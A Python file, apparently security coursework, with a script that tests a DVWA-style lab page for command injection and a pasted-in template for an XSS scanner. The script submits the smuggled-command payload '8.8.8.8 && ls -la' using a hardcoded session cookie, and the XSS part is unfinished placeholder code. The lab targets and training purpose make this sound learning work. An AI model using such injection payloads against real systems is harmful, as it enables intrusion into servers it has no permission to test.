import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re 

# --- CONFIGURATION ---
# IMPORTANT: Make sure this port matches the one you use in your server
BASE_URL = "http://host.docker.internal:8083" 

# --- STEP 1: PASTE YOUR COOKIE HERE ---
# Paste the 'PHPSESSID' value you copied from your browser
YOUR_COOKIE_VALUE = "vfdgc8deq6bp41nn0jo5no6qv6"
# ---

# This is our new target page
COMMAND_TEST_URL = f"{BASE_URL}/vulnerabilities/exec/"

# We will try to ping Google and then list files in the current directory
COMMAND_PAYLOAD = "8.8.8.8 && ls -la" 

# Create a session object to handle cookies
session = requests.Session()

# This header makes us look like a real browser
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})

# --- THIS IS THE MANUAL COOKIE METHOD ---
session.cookies.set('security', 'low')
session.cookies.set('PHPSESSID', YOUR_COOKIE_VALUE)
print("[*] Manual cookies have been set.")
# --- END OF COOKIE METHOD ---


def test_command_injection(url, payload):
    """
    Crawls the Command Injection page, finds the form, and tests it.
    """
    print(f"\n[+] Testing page: {url}")
    try:
        # Use the session, which now has our cookies
        response = session.get(url) 
        
        if response.status_code != 200:
            print(f"[!] Warning: Got status code {response.status_code}")
            return
            
        # Check if we were redirected to the login page
        if "login.php" in response.url:
            print("[!] FAILED. Server redirected to login.php. Your cookie might be wrong or expired.")
            return

        print("[+] Success! Got the Command Injection test page.")
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find the specific form for the test
        form = soup.find('form') 
        
        if form:
            print(f"  > Found the Command Injection form!")
            submit_command(form, url, payload)
        else:
            print("[!] Could not find the form on this page.")
                
    except requests.exceptions.RequestException as e:
        print(f"[!] ERROR: Could not crawl {url}. Error: {e}")

def submit_command(form, url, payload):
    """
    Submits the form with our payload.
    """
    action = form.get('action', '')
    target_url = urljoin(url, action) # The URL to submit to
    
    # The input field on this page is named 'ip'
    # The submit button is named 'Submit'
    data_to_submit = {
        'ip': payload,
        'Submit': 'Submit'
    }
            
    print(f"    [*] Submitting payload: {payload}")
    
    try:
        # This form uses the POST method
        response = session.post(target_url, data=data_to_submit)
        
        # 5. Check if the attack worked!
        # A successful 'ls -la' command will show the files
        # We can check for a file that we know is there, like "index.php"
        if "index.php" in response.text and "total" in response.text:
            print(f"    [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
            print(f"    [!!!] COMMAND INJECTION VULNERABILITY FOUND [!!!]")
            print(f"    [+] Payload was executed and listed server files.")
            print(f"    [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
        else:
            print(f"    [!] Payload did not appear to execute. Attack may have failed.")
            
    except requests.exceptions.RequestException as e:
        print(f"    [!] Error submitting form: {e}")


# --- MAIN EXECUTION ---
if __name__ == "__main__":
    
    if YOUR_COOKIE_VALUE == "PASTE_YOUR_COOKIE_HERE":
        print("[!] ERROR: Please paste your PHPSESSID cookie into the script on line 11.")
    else:
        print(f"\n--- STARTING COMMAND INJECTION SCAN ON {COMMAND_TEST_URL} ---")
        
        # Now that cookies are set, call the test
        test_command_injection(COMMAND_TEST_URL, COMMAND_PAYLOAD)
        
        print("\n--- CRAWL FINISHED ---")


        # week4_scanner.py

# --- Put all your imports here ---
# e.g., import requests
# from bs4 import BeautifulSoup
# ...

# This is the function week7_scanner is looking for
def scan(target_url):
    """
    Runs the XSS scan and returns a list of findings.
    """
    print(f"Scanning {target_url} for XSS...")

    # This list will hold all the vulnerabilities you find
    findings = []

    # ==========================================================
    # ===> PUT YOUR WEEK 4 SCANNING LOGIC HERE <===
    #
    # All of your code from the old week4_scanner.py
    # goes here, and it must be indented.
    #
    # ==========================================================


    # --- THIS IS THE IMPORTANT CHANGE ---
    # Find the part of your code where you check if a vulnerability was found.
    # Instead of just printing, do this:
    
    # PSEUDO-CODE: Replace this with your real check
    if you_find_an_xss_vulnerability:
        print("XSS vulnerability found!") # You can keep your print
        
        # Create the dictionary
        vulnerability = {
            "type": "Cross-Site Scripting (XSS)",
            "endpoint": "http://example.com/search?q=...", # The URL you tested
            "severity": "Medium",
            "mitigation": "Sanitize user input before rendering on the page."
        }
        # Add the dictionary to the 'findings' list
        findings.append(vulnerability)

    # At the very end of your function, return the list
    return findings


# This part goes at the VERY BOTTOM, with NO indentation.
# This lets you still run 'python week4_scanner.py' to test it.
if __name__ == "__main__":
    
    test_url = "http://127.0.0.1/dvwa" # Change this to your test URL
    
    results = scan(test_url)
    
    if results:
        print("Vulnerabilities found:")
        for res in results:
            print(res)
    else:
        print("No vulnerabilities found.")
